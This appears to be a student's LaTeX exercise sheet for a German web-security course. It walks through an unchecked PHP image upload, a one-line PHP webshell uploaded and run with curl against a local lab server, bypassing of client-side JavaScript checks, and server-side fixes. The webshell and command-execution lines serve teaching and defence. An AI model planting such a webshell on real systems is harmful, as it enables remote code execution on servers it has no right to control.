@@ -1,0 +1,180 @@
+\documentclass[
+	fontsize=12pt,
+	paper=a4,
+	numbers=noenddot,
+	listof=totoc,
+	listof=entryprefix,
+	listof=nochaptergap,
+	bibliography=totoc,
+	parskip=half,
+	openany
+]{scrbook}
+
+\include{../../for_latex/preamble}
+
+\lstset{
+	extendedchars=true,
+	inputencoding=utf8,
+	literate=
+		{ä}{{\"a}}1
+		{ö}{{\"o}}1
+		{ü}{{\"u}}1
+		{ß}{{\ss}}1
+		{Ä}{{\"A}}1
+		{Ö}{{\"O}}1
+		{Ü}{{\"U}}1
+}
+
+\begin{document}
+
+\begin{titlepage}
+	\pagestyle{empty}
+
+	\begin{flushright}
+		\begin{figure}[ht]
+			\flushright
+			\includegraphics[height=2cm]{../../for_latex/hfu}
+		\end{figure}
+	\end{flushright}
+
+	\begin{center}
+		\vspace{3cm}
+
+		{\fontsize{22}{22} \selectfont \textbf{Blatt 4}}\\[5mm]
+		{\fontsize{18}{18} \selectfont Web-Security und Intrusion Prevention}
+
+		\vspace{12cm}
+
+		{\fontsize{14}{14} \selectfont Luis Staudt}
+	\end{center}
+\end{titlepage}
+
+
+\chapter*{Aufgabe 1: Die Webanwendung}
+
+Die PHP-Anwendung (Apache, \texttt{php:7.2-apache}) erlaubt das Hochladen von
+Bildern. \texttt{upload.php} verschiebt die Datei lediglich nach
+\texttt{uploads/} und prüft nur die Dateigrösse; eine Prüfung des Dateityps
+findet nicht statt:
+
+\begin{lstlisting}[language=PHP]
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+...
+move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
+\end{lstlisting}
+
+Hochgeladene Dateien liegen damit ausführbar im Web-Root unter
+\texttt{uploads/}.
+
+\chapter*{Aufgabe 2: Schadcode hochladen}
+
+Als Schadcode dient eine minimale PHP-Webshell, stellvertretend für
+p0wny-shell oder phpbash:
+
+\begin{lstlisting}[language=PHP]
+<?php echo "<pre>"; system($_GET["cmd"] ?? "id"); echo "</pre>"; ?>
+\end{lstlisting}
+
+Der Upload erfolgt über das Formular oder direkt mit curl an den Endpunkt
+\texttt{upload.php}:
+
+\begin{lstlisting}[language=bash]
+curl -F "fileToUpload=@shell.php" -F "submit=Upload Image" http://127.0.0.1/upload.php
+-> Datei shell.php hochgeladen.
+\end{lstlisting}
+
+Der Aufruf der hochgeladenen Datei führt den Code aus (Remote Code Execution):
+
+\begin{lstlisting}[language=bash]
+curl "http://127.0.0.1/uploads/shell.php?cmd=id;whoami;uname%20-a"
+-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+   www-data
+   Linux ... x86_64 GNU/Linux
+\end{lstlisting}
+
+Der Code wird als Benutzer \texttt{www-data} auf dem Server ausgeführt.
+
+\chapter*{Aufgabe 3: Unzureichender Schutz (nur clientseitig)}
+
+Die Variante \texttt{index-js-security.php} prüft vor dem Upload per JavaScript,
+ob eine Bilddatei vorliegt (MIME-Typ, Dateiendung, \verb|accept="image/*"|):
+
+\begin{lstlisting}[language=Java]
+if (!file.type.startsWith("image/")) { ... e.preventDefault(); }
+const allowedExtensions = ["jpg","jpeg","png","gif","webp"];
+\end{lstlisting}
+
+Diese Prüfung findet ausschliesslich clientseitig im Browser statt.
+\texttt{upload.php} auf dem Server bleibt unverändert und prüft nichts. Im
+Browser erscheint bei Auswahl einer \texttt{.php}-Datei die Fehlermeldung
+\glqq Nur Bilddateien erlaubt!\grqq{}. Dabei handelt es sich um eine reine
+Komfortprüfung, nicht um einen Sicherheitsmechanismus.
+
+\chapter*{Aufgabe 4: Clientseitige Prüfung umgehen}
+
+Der Browser-Code lädt per POST (multipart/form-data) an \texttt{upload.php}. Mit
+curl wird die Datei direkt gesendet. Ohne Browser läuft kein JavaScript, sodass
+die clientseitige Prüfung vollständig entfällt:
+
+\begin{lstlisting}[language=bash]
+curl -F "fileToUpload=@shell.php" -F "submit=Upload Image" http://127.0.0.1/upload.php
+-> Datei shell.php hochgeladen.
+curl "http://127.0.0.1/uploads/shell.php?cmd=id"
+-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+\end{lstlisting}
+
+Trotz der IT-Security-Version bleibt die Remote Code Execution möglich. Eine
+clientseitige Prüfung bietet keinen Schutz, da der Angreifer den Client umgeht.
+
+\chapter*{Aufgabe 5: Serverseitige Absicherung}
+
+Die Absicherung erfolgt auf zwei Ebenen.
+
+\section*{a) Inhalt und Typ serverseitig prüfen (upload.php)}
+
+\begin{lstlisting}[language=PHP]
+// Inhalt pruefen: nur echte Bilder liefern getimagesize()
+$info = @getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+if ($info === false) { echo "Abgelehnt: kein gueltiges Bild."; $uploadOk = 0; }
+// Endung gegen Whitelist und passend zum erkannten MIME-Typ
+$mime_to_ext = ["image/jpeg"=>["jpg","jpeg"],"image/png"=>["png"],
+                "image/gif"=>["gif"],"image/webp"=>["webp"]];
+if (!in_array($ext,$allowed) || !in_array($ext,$mime_to_ext[$info["mime"]])) { ... }
+// eigener zufaelliger Dateiname statt der vom Angreifer gewaehlten Endung
+$safe = bin2hex(random_bytes(8)) . "." . $ext;
+\end{lstlisting}
+
+\section*{b) PHP-Ausführung im Upload-Ordner verbieten (Defense in Depth)}
+
+Zusätzlich wird Apache so konfiguriert, dass in \texttt{uploads/} kein PHP mehr
+ausgeführt wird. Selbst ein als Bild getarntes Polyglot würde dann nur als Datei
+ausgeliefert, nicht interpretiert:
+
+\begin{lstlisting}[language=bash]
+<Directory /var/www/html/uploads>
+    php_admin_flag engine off
+    <FilesMatch "\.(php|phtml|phar|php[0-9])$">
+        SetHandler none
+        Require all denied
+    </FilesMatch>
+</Directory>
+\end{lstlisting}
+
+\section*{Test mit curl}
+
+\begin{lstlisting}[language=bash]
+# reine PHP-Shell
+curl -F "fileToUpload=@shell.php" ...   -> Abgelehnt: kein gueltiges Bild.
+# Polyglot (echtes PNG + PHP) als evil.php
+curl -F "fileToUpload=@polyglot.php" ...-> Abgelehnt: Endung passt nicht zum Bildtyp.
+# Polyglot als evil.png -> gespeichert, aber nicht ausfuehrbar
+curl "http://127.0.0.1/uploads/<rnd>.png" -> liefert rohe Bytes, <?php ?> wird nicht ausgefuehrt
+# echtes Bild
+curl -F "fileToUpload=@sunglasses.png" ...-> Datei <rnd>.png hochgeladen.
+\end{lstlisting}
+
+Der Upload des Schadcodes wird damit verhindert, während echte Bilder weiterhin
+funktionieren.
+
+
+\end{document}
